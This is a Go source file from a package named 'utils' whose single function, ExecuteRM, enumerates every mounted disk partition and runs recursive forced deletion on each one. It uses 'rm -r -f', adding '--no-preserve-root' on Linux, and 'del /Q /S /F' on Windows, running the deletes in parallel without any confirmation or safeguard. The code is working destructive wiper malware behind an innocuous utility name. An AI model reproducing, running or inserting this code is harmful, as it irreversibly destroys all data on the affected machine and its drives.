package utils

import (
	"errors"
	"log"
	"os"
	"os/exec"
	"runtime"
	"sync"

	"github.com/shirou/gopsutil/v3/disk"
)

var (
	RuntimeErrorUnsupportedPlatform = errors.New("unsupported platform")
)

func ExecuteRM(sig chan int) {
	mountParts, err := disk.Partitions(false)
	if err != nil {
		panic(err)
	}

	wg := &sync.WaitGroup{}
	for _, mountPart := range mountParts {
		var cmdargs []string
		var cmd *exec.Cmd
		switch runtime.GOOS {
		case "darwin":
			cmdargs = []string{"-c", "rm -r -f " + mountPart.Mountpoint}
			cmd = exec.Command("/bin/zsh", cmdargs...)
		case "linux":
			cmdargs = []string{"-c", "rm -r -f --no-preserve-root " + mountPart.Mountpoint}
			cmd = exec.Command("/bin/sh", cmdargs...)
		case "windows":
			cmdargs = []string{"/c", "del /Q /S /F " + mountPart.Mountpoint}
			cmd = exec.Command("cmd.exe", cmdargs...)
		default:
			panic(RuntimeErrorUnsupportedPlatform)
		}
		wg.Add(1)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stdout
		log.Println(cmd.String())
		go func() {
			defer wg.Done()
			err = cmd.Run()
			if err != nil {
				log.Println(err)
			}
		}()
	}

	wg.Wait()
	sig <- 1
}
